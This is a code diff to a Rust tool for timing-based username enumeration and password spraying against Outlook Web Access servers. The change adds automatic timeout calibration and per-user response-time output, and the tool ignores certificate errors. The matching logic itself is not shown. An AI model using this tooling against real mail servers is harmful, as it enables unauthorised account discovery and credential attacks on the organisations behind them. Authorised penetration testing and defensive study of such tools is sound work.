@@ -30,8 +30,8 @@ struct Args {
     domain: Option<String>,
 
     /// Timeout to use for considering user does not exists
-    #[arg(long, default_value_t = 3)]
-    timeout: u64,
+    #[arg(long)]
+    timeout: Option<f64>,
 
     /// The number of thread to use
     #[arg(long, default_value_t = 4)]
@@ -75,12 +75,12 @@ fn main() {
         msg!("Checking on single user: {}", Color::wrap(&users[0], Color::BOLD));
     }
 
-    let client = Client::builder().danger_accept_invalid_certs(true)
-                                  .timeout(std::time::Duration::from_secs(args.timeout))
+    let client_no_timeout = Client::builder().danger_accept_invalid_certs(true)
+                                  .timeout(std::time::Duration::from_secs(15))
                                   .redirect(reqwest::redirect::Policy::none())
                                   .build().expect("Help, cannot create a HTTP Client");
 
-    let mut owa_enumerator = owa::utils::Owa::new(client, target, args.domain);
+    let mut owa_enumerator = owa::utils::Owa::new(client_no_timeout, target, args.domain);
     let owa_auth: owa::utils::OwaAuthMethod = owa_enumerator.get_auth_method();
 
     if owa_auth == owa::utils::OwaAuthMethod::Unknown {
@@ -100,22 +100,57 @@ fn main() {
         }
     }
 
+    let timeout_to_use: f64;
+    match args.timeout {
+        Some(timeout) => {
+            timeout_to_use = timeout;
+        }
+        None => {
+            log!("No timeout provided, calculating one");
+            let timeout = owa_enumerator.get_timeout_owa().as_secs_f64();
+            log!("Timeout for non existing user: {}{:.3}{} s",
+                                                 Color::YELLOW,
+                                                 timeout,
+                                                 Color::RESET);
+            timeout_to_use = timeout / 2.0;
+        }
+    }
+
+    let client = Client::builder().danger_accept_invalid_certs(true)
+                                  .timeout(std::time::Duration::from_secs_f64(timeout_to_use))
+                                  .redirect(reqwest::redirect::Policy::none())
+                                  .build().expect("Help, cannot create a HTTP Client");
+    owa_enumerator.set_client(client);
+
     let buffer = Arc::new(Mutex::new(String::new()));
     pool.install(|| {
         users.par_iter().for_each( |username| {
             match owa_enumerator.user_exists(&username, args.password.as_ref()) {
-                owa::utils::OwaResult::PasswordValid => {
-                    msg!("User {}:{} is valid", Color::wrap(&username, Color::CYAN), Color::wrap(args.password.as_ref(), Color::CYAN));
+                (owa::utils::OwaResult::PasswordValid, time) => {
+                    msg!("User {}:{} is valid [{}{:.3}{} s]",
+                         Color::wrap(&username, Color::CYAN),
+                         Color::wrap(args.password.as_ref(), Color::CYAN),
+                         Color::YELLOW,
+                         time.as_secs_f64(),
+                         Color::RESET);
                     let mut buf = buffer.lock().unwrap();
                     buf.push_str(&format!("{}:{}\n", username, args.password));
                 }
-                owa::utils::OwaResult::UserExists => {
-                    msg!("User {} exists", Color::wrap(&username, Color::CYAN));
+                (owa::utils::OwaResult::UserExists, time) => {
+                    msg!("User {} exists [{}{:.3}{} s]",
+                         Color::wrap(&username, Color::CYAN),
+                         Color::YELLOW,
+                         time.as_secs_f64(),
+                         Color::RESET);
                     let mut buf = buffer.lock().unwrap();
                     buf.push_str(&username);
                     buf.push('\n');
                 }
-                owa::utils::OwaResult::UserNotFound => err!("User {} does not exists", Color::wrap(&username, Color::BOLD)),
+                (owa::utils::OwaResult::UserNotFound, time) => err!("User {} does not exists [{}{:.3}{} s]",
+                                                                    Color::wrap(&username, Color::BOLD),
+                                                                    Color::YELLOW,
+                                                                    time.as_secs_f64(),
+                                                                    Color::RESET),
             }
         })
     });
